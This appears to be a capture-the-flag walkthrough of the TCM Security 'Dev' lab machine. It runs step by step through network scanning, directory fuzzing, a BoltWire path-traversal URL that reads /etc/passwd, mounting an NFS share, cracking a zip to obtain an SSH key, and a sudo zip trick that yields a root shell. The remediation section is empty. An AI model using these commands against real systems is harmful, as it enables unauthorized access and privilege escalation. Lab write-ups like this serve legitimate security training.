# Dev-CTF-Walkthrough
CyberLab-13


## Overview  

**Dev** is a vulnerable Linux machine from TCM Security that focuses on web enumeration, service exploitation, credential discovery, and Linux privilege escalation. The goal is to progress from initial reconnaissance to obtaining **root access**.

(https://tcm-sec.com/)

- Operating System:	Linux
- Difficulty:	Medium
- Goal:	Obtain Root Access

**Enviroment:**

- Kali Machine (Attacker).
- Dev (.ovf) VM.
- Make sure both VMs on the same virtual network (NAT).

  ----


## Reconnaissance

- Host Discovery:

```bash
netdiscover -r 192.168.38.0/24
```
<img width="872" height="309" alt="image" src="https://github.com/user-attachments/assets/91da90ed-650a-4f09-83b1-a93384091a11" />


```bash
nmap -sn 192.168.38.0/24
```

<img width="706" height="402" alt="image" src="https://github.com/user-attachments/assets/5ec23507-bbae-4525-be05-bc21993aa8b3" />


We can discover **Dev** via Ping Sweep (nmap) or Arp scan (netdiscover) and the discovered target has IP-Address (192.168.38.140).


---


## Enumeration

**1- Port Scanning:**

```bash
nmap -Pn -sC -sS -sV -p- -T4 192.168.38.140
```

<img width="594" height="691" alt="image" src="https://github.com/user-attachments/assets/3928002f-4dde-4aae-9516-0343b9b6ace9" />  

| Port | Service | Version / Details |
|------|---------|-------------------|
| 22 | SSH | OpenSSH 7.9p1 |
| 80 | HTTP | Apache httpd 2.4.38 |
| 111 | RPC | RPCBind |
| 2049 | NFS | Network File System |
| 8080 | HTTP | Apache httpd 2.4.38 |


**2- Subdirectory Enumeration:**

- On port (80)

  <img width="1240" height="866" alt="image" src="https://github.com/user-attachments/assets/79486dfb-5734-440a-b664-20b5f2de4347" />


```bash
ffuf -u http://192.168.38.140:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1280" height="925" alt="image" src="https://github.com/user-attachments/assets/d5c798fd-4c57-40b5-8b57-4c77228bd293" />

<img width="879" height="427" alt="image" src="https://github.com/user-attachments/assets/062ef029-db69-40a9-b088-d83e0e35c3b9" />
<img width="851" height="463" alt="image" src="https://github.com/user-attachments/assets/7977b848-6305-427c-80a6-311de972fe6c" />
<img width="841" height="452" alt="image" src="https://github.com/user-attachments/assets/6d5e9ea1-427c-475c-a8ae-7014250fe45e" />

After enumerating the web server running on port 80 with the subdirectory (/app), we gained valuable information about the application and discovered a username and password.

```bash
Username: bolt
Password: I_love_java
```  



- On port (8080)

  <img width="1275" height="858" alt="image" src="https://github.com/user-attachments/assets/04799cb4-56f1-468b-a053-0645bb363798" />
  

```bash
ffuf -u http://192.168.38.140:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

 <img width="1275" height="903" alt="image" src="https://github.com/user-attachments/assets/dbedab96-f004-438c-b5b4-a3ec9110d1a5" />
<img width="1266" height="599" alt="image" src="https://github.com/user-attachments/assets/f8a52d31-e620-456f-ac22-c6d2fbc26d69" />

```bash
Register
Username: tester
```

<img width="1193" height="454" alt="image" src="https://github.com/user-attachments/assets/cb2518b3-1e79-493a-878a-6b638daa4473" />

- BoltWire is an easy to use web development system with flexibility and power. 
- I will then search for boltwire version exploitation hoping to find any known vulnerability for it.
https://www.exploit-db.com/exploits/48411 

  <img width="1176" height="872" alt="image" src="https://github.com/user-attachments/assets/575eed32-4962-487c-a9d8-b7b706056930" />


```bash
http://192.168.38.140:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

<img width="1184" height="985" alt="image" src="https://github.com/user-attachments/assets/d9c3df5d-89c1-4261-88b9-6bae03b91b89" />

We were able to access the /etc/passwd and found a new Admin User **jeanpaul** that may help us later.

----


## Gaining Access

**3- NFS File inclosure:**

```bash
showmount -e 192.168.38.140
mkdir /mnt/dev
mount -t nfs 192.168.38.140:/srv/nfs /mnt/dev
cd /mmnt/dev
ls
unzip save.zip
```


<img width="716" height="268" alt="image" src="https://github.com/user-attachments/assets/5e1114b0-c9a6-4374-a845-455694758c09" />


- Now the .zip file is password protected so we will try crack it.

```bash
fcrackzip -u -D -v -p /usr/share/wordlists/rockyou.txt save.zip
unzip save.zip
ls
cat todo.txt
cat id_rsa
```

<img width="1201" height="230" alt="image" src="https://github.com/user-attachments/assets/ca3c9e27-71e4-4e34-b3fc-0c687b5551c2" />
<img width="969" height="875" alt="image" src="https://github.com/user-attachments/assets/89414c4b-1673-46a1-bbdf-ed764d99bd4f" />


- We now have both the **private key** and the password we discovered earlier: **`I_love_java`**. Since we have not used this password yet, let's try using it to authenticate to the server via SSH as the user **`jeanpaul`**.

```bash
ssh -i id_rsa jeanpaul@192.168.38.140
```

<img width="1204" height="487" alt="image" src="https://github.com/user-attachments/assets/24a1b8ac-8115-40e7-87c9-d6472d2de666" /> 

---


## Maintaining Access

- we now have authenticated to jeanpaul lets explore and see what we run as root.

```bash
sudo -l
```

<img width="1161" height="175" alt="image" src="https://github.com/user-attachments/assets/1723295c-1a77-4d95-be1a-cc0fd91500fa" />

- We now will search at (GTFOBins) for a privilege escalation. GTFOBins is a website that shows you how certain Linux commands/programs can be abused for privilege escalation.
  https://gtfobins.gm7.org/#zip

  <img width="981" height="454" alt="image" src="https://github.com/user-attachments/assets/e997ee26-2f39-44b8-98f9-b34093bfc117" />
  <img width="1168" height="741" alt="image" src="https://github.com/user-attachments/assets/eb59fae9-5b66-432b-9004-dc759cb603d7" />

```bash
 TF=$(mktemp -u)  
 sudo zip $TF /etc/hosts -T -TT 'sh #'  
 sudo rm $TF  
```      

<img width="1190" height="424" alt="image" src="https://github.com/user-attachments/assets/f2b297e2-3b94-489d-9208-7f7e940800a4" />



---


## Vulnerabilities & Remediation

- 




---

## Lessons Learned


  



